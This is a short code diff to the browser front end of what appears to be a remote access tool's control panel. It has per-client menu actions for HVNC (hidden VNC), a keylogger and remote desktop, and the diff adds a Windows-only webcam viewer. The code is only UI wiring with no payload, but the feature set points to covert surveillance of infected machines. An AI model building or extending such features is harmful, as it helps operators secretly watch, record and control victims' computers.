@@ -83,6 +83,9 @@ function applyMenuSupportRules(clientId) {
   const hvncBtn = menu.querySelector('[data-open="hvnc"]');
   setAvailability(hvncBtn, isWindows, "HVNC is only supported on Windows clients.");
 
+  const webcamBtn = menu.querySelector('[data-open="webcam"]');
+  setAvailability(webcamBtn, isWindows, "Webcam viewer is only supported on Windows clients.");
+
   const keyloggerBtn = menu.querySelector('[data-open="keylogger"]');
   setAvailability(
     keyloggerBtn,
@@ -592,6 +595,11 @@ menu.addEventListener("click", async (e) => {
   }
   if (open === "remotedesktop") {
     window.open(`/remotedesktop?clientId=${contextCard}`, "_blank", "noopener");
+    closeMenu(clearContext);
+    return;
+  }
+  if (open === "webcam") {
+    window.open(`/webcam?clientId=${contextCard}`, "_blank", "noopener");
     closeMenu(clearContext);
     return;
   }
